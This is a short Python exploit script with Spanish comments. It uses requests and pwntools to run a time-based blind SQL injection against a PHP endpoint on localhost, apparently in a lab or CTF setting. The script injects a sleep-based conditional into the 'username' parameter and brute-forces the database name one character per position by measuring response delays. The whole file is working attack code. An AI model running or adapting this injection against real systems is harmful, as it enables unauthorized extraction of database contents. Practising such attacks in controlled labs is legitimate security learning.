#!/usr/bin/python3

import requests, time
from pwn import *

url = "http://localhost:1234/index.php"

p1 = log.progress("SQLi blind")
p2 = log.progress("Database name")

session = requests.Session()

dic_letters = "abcdefghijklmnopqrstuvwxyz0123456789.+!$#-_<>~}:\"\'{*][%,&/\)(=ABCDEFGHIJKLMNOPQRSTUVWXYZ"
result = ""

# Recorremos como si la palabra encontrada tuviera 15 caracteres
for position in range(1, 16):
    # Probamos con cada letra de nuestro diccionario
    for letter in dic_letters:
        # Obtenemos el tiempo antes de la peticion
        time_now = time.time()
        
        # Validamos X letra en N posicion
        payload = "?method=select&"
        payload += "username=administrator' and if(substr(database(),%d,1)='%s',sleep(3),1) and '1'='1&" % (position, letter)
        payload += "table=passwords"

        p1.status(payload)
        r = session.get(url + payload)

        # Obtenemos el tiempo despues de la peticion
        time_after = time.time()

        # Si la diferencia de tiempos en mayor a 3, sabemos que la letra que probo esta en la base de datos, asi que la guardamos
        if time_after - time_now > 2:
            result += letter
            p2.status(result)
            break

p1.success("Done")
p2.success(result)
